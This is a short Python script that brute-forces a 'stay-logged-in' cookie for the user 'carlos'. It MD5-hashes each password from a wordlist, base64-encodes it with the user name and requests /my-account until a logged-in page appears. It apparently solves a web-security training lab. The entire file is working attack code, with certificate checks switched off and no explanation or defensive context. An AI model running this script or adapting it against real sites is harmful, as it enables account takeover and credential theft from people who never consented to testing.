import requests
import sys
import hashlib
import base64
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def carlos_brute(url, wordlist):
    print("[+] Bruteforcing carlos' password")
    r = requests.Session()
    for line in open(wordlist, "r"):
        password = line.rstrip('\r\n')
        hash_pass = "carlos:" + hashlib.md5(password.encode("utf-8")).hexdigest()
        encode_pass = base64.b64encode(bytes(hash_pass, "utf-8"))
        payload = encode_pass.decode("utf-8")
        
        account_page = url + "/my-account"
        cookies = {"stay-logged-in": payload}
        req = r.get(account_page, cookies=cookies, verify=False)
        
        if "Log out" in req.text:
            print(f"\n[+] Password found: {password}")
            sys.exit(0)
        
        sys.stdout.write(f"\r[*] Trying: {password:<20}")
        sys.stdout.flush()
    print("\n[-] Password not found")

def main():
    if len(sys.argv) != 3:
        print(f"[+] Usage: {sys.argv[0]} <url> <password_list>")
        sys.exit(1)
    url = sys.argv[1].strip().rstrip("/")
    wordlist = sys.argv[2].strip()
    print(f"[*] Target: {url}")
    carlos_brute(url, wordlist)

if __name__ == "__main__":
    main()